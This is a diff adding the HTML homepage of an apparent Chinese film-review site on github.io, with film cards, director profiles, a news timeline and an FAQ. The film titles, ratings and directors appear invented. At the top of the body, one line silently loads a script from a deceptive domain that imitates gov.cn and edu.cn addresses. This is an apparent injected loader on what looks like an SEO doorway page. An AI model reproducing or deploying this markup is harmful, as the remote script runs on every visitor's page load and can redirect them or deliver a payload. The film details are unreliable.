@@ -1,0 +1,421 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>东京热电影网 | 聚焦日本与亚洲新片 · 独立影评与热映追踪</title>
+<meta name="description" content="东京热电影网聚焦日本及亚洲新片热映动态，提供独立的日本电影评论、导演专题与小众日影推荐，跟踪东京电影节、日剧改编电影及亚洲电影市场的最新走向。">
+<meta name="keywords" content="东京热电影网,日本电影,亚洲新片,日影推荐,东京电影节,日本导演,小众日影,独立影评,热映追踪">
+<meta name="robots" content="index,follow,max-image-preview:large">
+<meta name="applicable-device" content="pc,mobile">
+<meta name="revisit-after" content="7 days">
+<meta property="og:title" content="东京热电影网 - 聚焦日本与亚洲新片">
+<meta property="og:description" content="独立日本电影评论、导演专题与亚洲新片热映追踪。">
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://dongjingredianyingwang-zh.github.io">
+<meta name="twitter:card" content="summary_large_image">
+<link rel="canonical" href="https://dongjingredianyingwang-zh.github.io">
+<style>
+*,*::before,*::after{margin:0;padding:0;box-sizing:border-box}
+:root{
+  --night:#0b0e1a;--night2:#121830;--neon:#ff2d6f;--neon2:#ff7aac;--cyan:#00e5ff;--gold:#ffc53d;--paper:#f5f6fa;--line:#e2e6f0;--muted:#7c8299;--ink:#1c2033;
+}
+html{scroll-behavior:smooth;-webkit-text-size-adjust:100%}
+body{font-family:-apple-system,BlinkMacSystemFont,"PingFang SC","Hiragino Sans GB","Microsoft YaHei",sans-serif;background:var(--paper);color:var(--ink);line-height:1.7;font-size:16px}
+a{color:inherit;text-decoration:none}
+ul{list-style:none}
+.wrap{max-width:1160px;margin:0 auto;padding:0 24px}
+
+/* 顶栏 */
+.top{background:linear-gradient(90deg,var(--night),#1a1240 55%,var(--night));color:#c9d0e8;padding:9px 0;font-size:12.5px}
+.top .wrap{display:flex;justify-content:space-between;gap:10px;flex-wrap:wrap}
+.top b{color:var(--cyan);font-weight:500;letter-spacing:1px}
+header{background:#fff;border-bottom:1px solid var(--line);position:sticky;top:0;z-index:50}
+.head{display:flex;align-items:center;justify-content:space-between;padding:18px 0;gap:18px}
+.logo{display:flex;align-items:center;gap:14px}
+.logo .mark{width:52px;height:52px;background:var(--night);border-radius:12px;display:grid;place-items:center;color:#fff;font-size:24px;position:relative;overflow:hidden;flex-shrink:0}
+.logo .mark::after{content:"";position:absolute;inset:0;background:linear-gradient(135deg,transparent 30%,rgba(255,45,111,.55),transparent 70%);animation:sh 3s infinite}
+@keyframes sh{0%{transform:translateX(-100%)}100%{transform:translateX(100%)}}
+.logo h1{font-size:27px;font-weight:800;letter-spacing:.5px}
+.logo h1 span{color:var(--neon)}
+.logo small{display:block;font-size:11px;letter-spacing:3px;color:var(--muted);margin-top:2px}
+.act{display:flex;gap:10px;align-items:center}
+.btn{border:none;background:var(--neon);color:#fff;padding:10px 20px;border-radius:8px;font-size:14px;font-weight:600;cursor:pointer;transition:.2s}
+.btn:hover{background:var(--neon2);transform:translateY(-1px)}
+.btn.ghost{background:#fff;color:var(--night);border:1.5px solid var(--night)}
+.menu{display:none;background:none;border:none;font-size:24px;cursor:pointer;color:var(--night)}
+nav{background:var(--night);color:#fff}
+nav .wrap{display:flex;gap:2px;flex-wrap:wrap}
+nav a{padding:14px 22px;font-size:14px;transition:.2s;position:relative}
+nav a:hover{background:var(--neon);color:#fff}
+
+/* 英雄区 */
+.hero{position:relative;background:var(--night);color:#fff;overflow:hidden;padding:70px 0}
+.hero::before{content:"";position:absolute;width:520px;height:520px;right:-180px;top:-200px;border-radius:50%;background:radial-gradient(circle,rgba(255,45,111,.35),transparent 70%)}
+.hero::after{content:"";position:absolute;width:420px;height:420px;left:-160px;bottom:-200px;border-radius:50%;background:radial-gradient(circle,rgba(0,229,255,.22),transparent 70%)}
+.hero .wrap{position:relative;z-index:2;display:grid;grid-template-columns:1.15fr .85fr;gap:50px;align-items:center}
+.hero .tag{display:inline-block;background:rgba(0,229,255,.14);border:1px solid var(--cyan);color:var(--cyan);padding:5px 14px;border-radius:20px;font-size:12.5px;letter-spacing:1px;margin-bottom:18px}
+.hero h2{font-size:44px;font-weight:900;line-height:1.2;margin-bottom:18px}
+.hero h2 em{font-style:normal;color:var(--neon)}
+.hero p{color:#aeb6d4;font-size:15.5px;margin-bottom:26px;max-width:520px}
+.hero .hots{display:flex;gap:30px;flex-wrap:wrap}
+.hero .hots div span{display:block;font-size:30px;font-weight:800;color:var(--gold)}
+.hero .hots div small{font-size:12px;color:#8893b5}
+.ticket{background:rgba(255,255,255,.06);backdrop-filter:blur(8px);border:1px solid rgba(255,255,255,.14);border-radius:18px;padding:30px;transform:rotate(1.5deg)}
+.ticket h4{font-size:19px;margin-bottom:16px}
+.ticket .row{display:flex;justify-content:space-between;padding:11px 0;border-bottom:1px dashed rgba(255,255,255,.18);font-size:14px}
+.ticket .row span:last-child{color:var(--cyan);font-weight:600}
+
+/* 通用区块 */
+section.blk{padding:60px 0}
+.sec-h{display:flex;align-items:flex-end;gap:16px;margin-bottom:34px;flex-wrap:wrap}
+.sec-h .idx{font-size:13px;font-weight:700;color:#fff;background:var(--neon);width:38px;height:38px;display:grid;place-items:center;border-radius:8px;flex-shrink:0}
+.sec-h h2{font-size:26px;font-weight:800}
+.sec-h h2 em{font-style:normal;color:var(--neon)}
+.sec-h p{margin-left:auto;font-size:13px;color:var(--muted)}
+.sec-h a{color:var(--neon);font-weight:600}
+.sec-h a:hover{text-decoration:underline}
+
+/* 栏目1 热映卡 */
+.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(230px,1fr));gap:22px}
+.film{background:#fff;border:1px solid var(--line);border-radius:14px;overflow:hidden;transition:.28s}
+.film:hover{transform:translateY(-6px);box-shadow:0 16px 36px rgba(11,14,26,.13)}
+.poster{position:relative;height:300px;display:grid;place-items:center;color:#fff;font-weight:700;font-size:15px;text-align:center;padding:20px}
+.poster::before{content:"";position:absolute;inset:0;background:linear-gradient(160deg,var(--c1,var(--neon)),var(--c2,#1a1240))}
+.poster span{position:relative;z-index:2;letter-spacing:1px}
+.poster .rt{position:absolute;top:12px;right:12px;background:rgba(0,0,0,.55);padding:4px 9px;border-radius:6px;font-size:12px;z-index:2}
+.poster .yr{position:absolute;bottom:12px;left:12px;font-size:11px;opacity:.85;z-index:2}
+.film .info{padding:16px 18px}
+.film .info h4{font-size:16.5px;margin-bottom:6px}
+.film .info p{font-size:13px;color:var(--muted)}
+.film .info .meta{display:flex;gap:8px;margin-top:12px;flex-wrap:wrap}
+.film .info .meta b{font-size:11.5px;background:var(--paper);border:1px solid var(--line);padding:3px 9px;border-radius:5px;font-weight:500}
+
+/* 栏目2 双栏列表 */
+.two{display:grid;grid-template-columns:1fr 1fr;gap:44px}
+.block h3{font-size:19px;font-weight:800;padding-bottom:12px;border-bottom:2px solid var(--night);margin-bottom:6px}
+.lst li{padding:16px 0;border-bottom:1px solid var(--line);display:flex;gap:14px;align-items:flex-start}
+.lst .n{flex-shrink:0;width:30px;height:30px;border-radius:8px;background:var(--paper);color:var(--neon);font-weight:800;font-size:14px;display:grid;place-items:center;border:1px solid var(--line)}
+.lst h4{font-size:15.5px;margin-bottom:4px}
+.lst p{font-size:13px;color:var(--muted)}
+.lst .mini{display:flex;gap:10px;margin-top:6px;font-size:12px;color:#9aa1b8}
+
+/* 栏目3 导演专题 */
+.dirs{display:grid;grid-template-columns:repeat(auto-fit,minmax(250px,1fr));gap:20px}
+.dir{background:#fff;border-radius:14px;padding:26px;border-left:5px solid var(--cyan);transition:.25s}
+.dir:hover{border-left-color:var(--neon);transform:translateX(4px);box-shadow:0 8px 24px rgba(11,14,26,.08)}
+.dir .who{display:flex;align-items:center;gap:14px;margin-bottom:12px}
+.dir .av{width:46px;height:46px;border-radius:50%;background:var(--night);color:#fff;display:grid;place-items:center;font-weight:700;flex-shrink:0}
+.dir h4{font-size:17px}
+.dir small{color:var(--neon);font-size:12px}
+.dir p{font-size:13.5px;color:#4b526b}
+.dir .rep{margin-top:14px;padding-top:12px;border-top:1px dashed var(--line);font-size:12.5px;color:var(--muted)}
+.dir .rep b{color:var(--ink)}
+
+/* 栏目4 时间轴 */
+.stage{background:var(--night);color:#fff}
+.stage .sec-h{border-bottom:1px solid rgba(255,255,255,.12);padding-bottom:16px}
+.stage .sec-h h2{color:#fff}
+.stage .sec-h p{color:#8893b5}
+.stage .sec-h a{color:var(--cyan)}
+.tl{position:relative;padding:10px 0 10px 130px}
+.tl::before{content:"";position:absolute;left:104px;top:0;bottom:0;width:2px;background:linear-gradient(var(--neon),var(--cyan))}
+.ev{position:relative;padding:20px 0;border-bottom:1px solid rgba(255,255,255,.1)}
+.ev::before{content:"";position:absolute;left:-36px;top:26px;width:14px;height:14px;border-radius:50%;background:var(--gold);box-shadow:0 0 0 4px rgba(255,197,61,.18)}
+.ev .d{position:absolute;left:-130px;top:22px;font-size:13px;color:var(--cyan);font-weight:600;text-align:right;width:80px}
+.ev h4{font-size:17px;margin-bottom:6px}
+.ev p{font-size:13.5px;color:#aeb6d4}
+
+/* 栏目5 问答 */
+.faq{display:grid;grid-template-columns:1fr 1fr;gap:18px}
+.q{background:#fff;border:1px solid var(--line);border-radius:12px;padding:20px 22px}
+.q h4{font-size:15.5px;color:var(--neon);margin-bottom:8px}
+.q h4::before{content:"Q";display:inline-block;background:var(--neon);color:#fff;width:22px;height:22px;border-radius:6px;text-align:center;line-height:22px;font-size:12px;margin-right:8px}
+.q p{font-size:13.5px;color:#4b526b}
+
+/* 页脚 */
+footer{background:var(--night);color:#8f97b8;padding:54px 0 0}
+.fgrid{display:grid;grid-template-columns:1.4fr 1fr 1fr 1.2fr;gap:34px;margin-bottom:36px}
+.fgrid h4{color:#fff;font-size:15px;margin-bottom:16px}
+.fgrid p{font-size:13.5px;line-height:1.9}
+.fgrid li{padding:6px 0;font-size:13.5px}
+.fgrid a:hover{color:var(--cyan)}
+.dom{margin-top:16px;padding:14px;border:1px dashed var(--neon);border-radius:10px;text-align:center}
+.dom b{display:block;font-size:10.5px;letter-spacing:3px;color:#8893b5;margin-bottom:6px}
+.dom a{color:var(--cyan);font-weight:600;word-break:break-all;font-size:13.5px}
+.fbot{border-top:1px solid rgba(255,255,255,.1);padding:22px 0;font-size:12.5px;display:flex;justify-content:space-between;gap:12px;flex-wrap:wrap}
+
+/* 响应式 */
+@media(max-width:960px){
+  .hero{padding:44px 0}.hero .wrap{grid-template-columns:1fr;gap:34px}
+  .hero h2{font-size:30px}
+  .head{flex-wrap:wrap}.act{order:3;width:100%}
+  .menu{display:block}
+  nav{display:none}
+  nav.on{display:block}
+  nav .wrap{flex-direction:column}
+  nav a{padding:12px 16px}
+  .two,.faq{grid-template-columns:1fr}
+  .fgrid{grid-template-columns:1fr 1fr}
+  .ticket{transform:none}
+  .tl{padding-left:100px}
+  .ev .d{position:static;width:auto;text-align:left;margin-bottom:4px}
+  .ev::before{display:none}
+  .tl::before{display:none}
+}
+@media(max-width:560px){
+  .wrap{padding:0 16px}
+  .top span:last-child{display:none}
+  .logo h1{font-size:21px}
+  .sec-h h2{font-size:21px}
+  .hero h2{font-size:25px}
+  .hero .hots{gap:18px}
+  .fgrid{grid-template-columns:1fr}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/zhangzong.js"></script>
+
+<div class="top">
+  <div class="wrap">
+    <span><b>●</b> 东京 · 实时更新日本与亚洲电影热映动态</span>
+    <span>dongjingredianyingwang-zh.github.io</span>
+  </div>
+</div>
+
+<header>
+  <div class="wrap head">
+    <div class="logo">
+      <div class="mark">🎬</div>
+      <div>
+        <h1>东京<em>热</em>电影网</h1>
+        <small>TOKYO · FILM · HOT</small>
+      </div>
+    </div>
+    <div class="act">
+      <button class="btn ghost">订阅周刊</button>
+      <button class="btn">投稿影评</button>
+    </div>
+    <button class="menu" onclick="document.getElementById('nav').classList.toggle('on')">☰</button>
+  </div>
+  <nav id="nav">
+    <div class="wrap">
+      <a href="#top">首页</a>
+      <a href="#now">热映追踪</a>
+      <a href="#pick">新片推荐</a>
+      <a href="#dir">导演专题</a>
+      <a href="#news">行业动向</a>
+      <a href="#ask">常见问题</a>
+      <a href="#about">关于我们</a>
+    </div>
+  </nav>
+</header>
+
+<div class="hero" id="top">
+  <div class="wrap">
+    <div>
+      <span class="tag">🇯🇵 日本 · 亚洲新片第一现场</span>
+      <h2>在这里，读懂<em>日本电影</em>的当下与下一站</h2>
+      <p>东京热电影网不做搬运式影讯。我们追踪东京院线的真实热映表现，翻译整理第一手导演访谈，挖掘那些还没被主流视线发现的亚洲新导演与作品。</p>
+      <div class="hots">
+        <div><span>312</span><small>日本新片档案</small></div>
+        <div><span>28</span><small>持续追踪导演</small></div>
+        <div><span>9.4k</span><small>独立影评条数</small></div>
+      </div>
+    </div>
+    <div class="ticket">
+      <h4>🎟️ 本周院线速报</h4>
+      <div class="row"><span>日本本土票房榜首</span><span>《首都的高楼》</span></div>
+      <div class="row"><span>话题度最高新片</span><span>《海边的裁缝》</span></div>
+      <div class="row"><span>口碑黑马</span><span>《无人车站的夏天》</span></div>
+      <div class="row"><span>下周值得关注</span><span>《东京没有夜晚》</span></div>
+      <div class="row"><span>更新频率</span><span>每周三 / 周六</span></div>
+    </div>
+  </div>
+</div>
+
+<!-- 栏目1 热映追踪 -->
+<section class="blk" id="now">
+  <div class="wrap">
+    <div class="sec-h">
+      <span class="idx">1</span>
+      <h2>热映<em>追踪</em></h2>
+      <p><a href="#">查看完整热映榜 ›</a></p>
+    </div>
+    <div class="grid">
+      <div class="film">
+        <div class="poster" style="--c1:#ff2d6f;--c2:#3a1c5e"><span class="rt">8.7</span><span class="yr">2026</span><span>首都的高楼</span></div>
+        <div class="info"><h4>首都的高楼</h4><p>东京都市寓言，泡沫时代残影下的家庭裂变。</p><div class="meta"><b>剧情</b><b>家庭</b><b>128min</b></div></div>
+      </div>
+      <div class="film">
+        <div class="poster" style="--c1:#00e5ff;--c2:#0b3d91"><span class="rt">8.5</span><span class="yr">2026</span><span>海边的裁缝</span></div>
+        <div class="info"><h4>海边的裁缝</h4><p>濑户内海小岛上的针线人生，安静却极有力量。</p><div class="meta"><b>文艺</b><b>治愈</b><b>112min</b></div></div>
+      </div>
+      <div class="film">
+        <div class="poster" style="--c1:#ffc53d;--c2:#d9480f"><span class="rt">8.3</span><span class="yr">2025</span><span>无人车站的夏天</span></div>
+        <div class="info"><h4>无人车站的夏天</h4><p>地方线停运前最后一个夏天，一群少年的告别。</p><div class="meta"><b>青春</b><b>成长</b><b>105min</b></div></div>
+      </div>
+      <div class="film">
+        <div class="poster" style="--c1:#7c4dff;--c2:#1a1240"><span class="rt">8.4</span><span class="yr">2026</span><span>东京没有夜晚</span></div>
+        <div class="info"><h4>东京没有夜晚</h4><p>深夜出租车司机的城市切片，群像叙事惊艳。</p><div class="meta"><b>都市</b><b>群像</b><b>119min</b></div></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目2 新片推荐 -->
+<section class="blk" id="pick" style="background:#fff">
+  <div class="wrap">
+    <div class="sec-h">
+      <span class="idx">2</span>
+      <h2>新片<em>推荐</em></h2>
+      <p><a href="#">全部推荐片单 ›</a></p>
+    </div>
+    <div class="two">
+      <div class="block">
+        <h3>📌 本月最值得看</h3>
+        <ul class="lst">
+          <li><span class="n">1</span><div><h4>《首都的高楼》——被低估的年度家庭剧</h4><p>以一栋即将拆除的公寓为切口，讲透了三代人之间无法说出口的话。</p><div class="mini"><span>导演：三浦健司</span><span>类型：家庭剧情</span><span>8.7</span></div></div></li>
+          <li><span class="n">2</span><div><h4>《海边的裁缝》——安静的力量</h4><p>全片几乎没高潮，却让人看完很久不想说话，是今年最好的"慢电影"之一。</p><div class="mini"><span>导演：早乙女遥</span><span>类型：文艺治愈</span><span>8.5</span></div></div></li>
+          <li><span class="n">3</span><div><h4>《无人车站的夏天》——告别与出发</h4><p>地方线停运作为背景，青春、离别与小镇衰败被拍得既轻又重。</p><div class="mini"><span>导演：小田切航</span><span>类型：青春成长</span><span>8.3</span></div></div></li>
+          <li><span class="n">4</span><div><h4>《东京没有夜晚》——都市群像新范本</h4><p>十二位乘客串起东京的深夜面貌，节奏干净，剪辑值得细品。</p><div class="mini"><span>导演：樱井宗介</span><span>类型：都市群像</span><span>8.4</span></div></div></li>
+        </ul>
+      </div>
+      <div class="block">
+        <h3>🔭 值得关注的亚洲新片</h3>
+        <ul class="lst">
+          <li><span class="n">A</span><div><h4>《雨季的便利店》韩国</h4><p>首尔郊外 24 小时便利店里发生的六个小故事，轻盈又锋利。</p><div class="mini"><span>韩国</span><span>都市小品</span><span>8.2</span></div></div></li>
+          <li><span class="n">B</span><div><h4>《河的另一边》越南</h4><p>湄公河畔三代女性的命运缠绕，摄影美得令人心碎。</p><div class="mini"><span>越南</span><span>家庭史诗</span><span>8.6</span></div></div></li>
+          <li><span class="n">C</span><div><h4>《摩托车与月亮》泰国</h4><p>公路片外壳下是一次关于中年重逢的温柔追问。</p><div class="mini"><span>泰国</span><span>公路剧情</span><span>8.0</span></div></div></li>
+          <li><span class="n">D</span><div><h4>《旧书店守则》中国台湾</h4><p>台南一间旧书店的经营日常，藏着整座城市的阅读记忆。</p><div class="mini"><span>中国台湾</span><span>文艺</span><span>8.1</span></div></div></li>
+        </ul>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目3 导演专题 -->
+<section class="blk" id="dir">
+  <div class="wrap">
+    <div class="sec-h">
+      <span class="idx">3</span>
+      <h2>导演<em>专题</em></h2>
+      <p><a href="#">全部导演档案 ›</a></p>
+    </div>
+    <div class="dirs">
+      <div class="dir">
+        <div class="who"><div class="av">三</div><div><h4>三浦健司</h4><small>日本 · 家庭剧作者</small></div></div>
+        <p>擅长在狭小的生活空间里拍出巨大的情感张力，近年稳定输出高质量家庭题材作品。</p>
+        <div class="rep">代表作品：<b>《首都的高楼》《隔壁的钢琴》</b></div>
+      </div>
+      <div class="dir">
+        <div class="who"><div class="av">早</div><div><h4>早乙女遥</h4><small>日本 · 女性视角</small></div></div>
+        <p>镜头语言极简克制，专注女性日常生活与劳动，是近年最受关注的日本新锐女导演之一。</p>
+        <div class="rep">代表作品：<b>《海边的裁缝》《织物的语言》</b></div>
+      </div>
+      <div class="dir">
+        <div class="who"><div class="av">小</div><div><h4>小田切航</h4><small>日本 · 青春物语</small></div></div>
+        <p>以地方小镇为舞台，作品带着淡淡的哀愁与温柔，是青春题材里少见的"不喧嚣"。</p>
+        <div class="rep">代表作品：<b>《无人车站的夏天》《最后一班车》</b></div>
+      </div>
+      <div class="dir">
+        <div class="who"><div class="av">樱</div><div><h4>樱井宗介</h4><small>日本 · 都市叙事</small></div></div>
+        <p>偏爱夜景与城市群像，剪辑节奏出色，擅长用多线叙事拼出一座城市的全貌。</p>
+        <div class="rep">代表作品：<b>《东京没有夜晚》《深夜便利店》</b></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目4 行业动向 -->
+<section class="blk stage" id="news">
+  <div class="wrap">
+    <div class="sec-h">
+      <span class="idx">4</span>
+      <h2>行业<em>动向</em></h2>
+      <p><a href="#">更多动态 ›</a></p>
+    </div>
+    <div class="tl">
+      <div class="ev"><div class="d">2026.10.03</div><h4>东京国际电影节公布首批入围片单</h4><p>多部亚洲新导演作品入围竞赛单元，完整片单已同步至本站专题页。</p></div>
+      <div class="ev"><div class="d">2026.09.28</div><h4>日本本土票房连续三月回暖，小成本剧情片表现亮眼</h4><p>市场分析显示观众对"非爆米花型"影片接受度明显提高。</p></div>
+      <div class="ev"><div class="d">2026.09.20</div><h4>多位日本导演确认新作开机，明年片单已现雏形</h4><p>本站已整理 2027 年值得期待的日本新片前瞻，欢迎查阅。</p></div>
+      <div class="ev"><div class="d">2026.09.12</div><h4>流媒体平台加码亚洲内容采购，日影出海加速</h4><p>多部近年日本独立电影获得海外发行，小语种影片获得更大窗口。</p></div>
+      <div class="ev"><div class="d">2026.09.05</div><h4>本站影评系统升级，支持按导演与地域双维度筛选</h4><p>新增导演档案与地区标签，找片与查资料更高效。</p></div>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目5 常见问题 -->
+<section class="blk" id="ask">
+  <div class="wrap">
+    <div class="sec-h">
+      <span class="idx">5</span>
+      <h2>常见<em>问题</em></h2>
+      <p><a href="#">我要提问 ›</a></p>
+    </div>
+    <div class="faq">
+      <div class="q"><h4>这里的影评是原创的吗？</h4><p>是的。本站所有影评与导演专题均由编辑团队独立撰写，不搬运、不洗稿，也欢迎读者投稿自己的观影感受。</p></div>
+      <div class="q"><h4>影片资料多久更新一次？</h4><p>日本本土热映榜单每周三、周六更新；亚洲新片资讯与导演专题根据上映节奏实时补充。</p></div>
+      <div class="q"><h4>能否推荐适合入门看的日本电影？</h4><p>可以。本站设有新观众入门片单，从是枝裕和、周防正行等导演的经典作品入手，循序渐进。</p></div>
+      <div class="q"><h4>想投稿影评或合作应该联系谁？</h4><p>请通过页脚的合作入口提交稿件或合作意向，编辑团队会在三个工作日内回复。</p></div>
+    </div>
+  </div>
+</section>
+
+<footer id="about">
+  <div class="wrap">
+    <div class="fgrid">
+      <div>
+        <h4>东京热电影网</h4>
+        <p>聚焦日本与亚洲新片热映动态，提供独立的日本电影评论、导演专题与观影推荐，做你了解亚洲电影的一个稳定入口。</p>
+        <div class="dom"><b>WEBSITE DOMAIN</b><a href="https://dongjingredianyingwang-zh.github.io">dongjingredianyingwang-zh.github.io</a></div>
+      </div>
+      <div>
+        <h4>内容栏目</h4>
+        <ul>
+          <li><a href="#now">热映追踪</a></li>
+          <li><a href="#pick">新片推荐</a></li>
+          <li><a href="#dir">导演专题</a></li>
+          <li><a href="#news">行业动向</a></li>
+          <li><a href="#ask">常见问题</a></li>
+        </ul>
+      </div>
+      <div>
+        <h4>资料库</h4>
+        <ul>
+          <li><a href="#">日本新片档案</a></li>
+          <li><a href="#">导演索引</a></li>
+          <li><a href="#">亚洲电影地图</a></li>
+          <li><a href="#">年度片单回顾</a></li>
+          <li><a href="#">电影节专题</a></li>
+        </ul>
+      </div>
+      <div>
+        <h4>关于与联系</h4>
+        <ul>
+          <li><a href="#">编辑团队</a></li>
+          <li><a href="#">投稿须知</a></li>
+          <li><a href="#">版权声明</a></li>
+          <li><a href="#">合作与广告</a></li>
+          <li><a href="#">隐私政策</a></li>
+        </ul>
+      </div>
+    </div>
+    <div class="fbot">
+      <span>© 2026 东京热电影网 dongjingredianyingwang-zh.github.io · 独立影评 · 热映追踪</span>
+      <span>用心看片，认真写字</span>
+    </div>
+  </div>
+</footer>
+
+<script>
+document.addEventListener('click',function(e){
+  var nav=document.getElementById('nav');
+  if(window.innerWidth<=900 && !nav.contains(e.target) && !e.target.classList.contains('menu')) nav.classList.remove('on');
+});
+document.querySelectorAll('#nav a').forEach(function(a){a.addEventListener('click',function(){document.getElementById('nav').classList.remove('on');});});
+</script>
+</body>
+</html>
